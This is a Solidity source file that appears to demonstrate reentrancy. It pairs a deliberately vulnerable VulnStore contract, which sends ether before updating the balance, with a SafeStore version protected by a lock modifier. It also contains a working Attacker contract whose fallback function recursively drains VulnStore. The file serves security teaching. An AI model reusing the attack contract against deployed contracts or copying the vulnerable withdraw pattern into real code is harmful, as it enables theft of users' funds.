//SPDX-License-Identifier: MIT
pragma solidity >= 0.7.1;

contract VulnStore {

  mapping(address => uint) public balances;

  function deposit() external payable {
    balances[msg.sender] += msg.value;
  }
  
  function withdraw(uint _amount) external {
    require(balances[msg.sender] >= _amount);    
    (bool sent, ) = msg.sender.call{value: _amount}("");
    require(sent, "Failed to send ether");
    balances[msg.sender] -= _amount;
  }

}

contract SafeStore {

  mapping(address => uint) public balances;
  bool internal locked;

  modifier reentrancyGuard() {
      require(!locked, "Contract is locked");
      locked = true;
      _;
      locked = false;
  }

  function deposit() external payable {
    balances[msg.sender] += msg.value;
  }
  
  function withdraw(uint _amount) external reentrancyGuard {
    require(balances[msg.sender] >= _amount);    
    (bool sent, ) = msg.sender.call{value: _amount}("");
    require(sent, "Failed to send ether");
    balances[msg.sender] -= _amount;
  }

}

contract Attacker {

  VulnStore public vulnStore;

  constructor(address _vulnStoreAddress) {
      vulnStore = VulnStore(_vulnStoreAddress);
  }

  fallback() external payable {
    if (address(vulnStore).balance >= 1 ether) {
          vulnStore.withdraw(1 ether);
      }
  }

  function attack() external payable {
      require(msg.value >= 1 ether);
      vulnStore.deposit{value: 1 ether}();
      vulnStore.withdraw(1 ether);
  }

}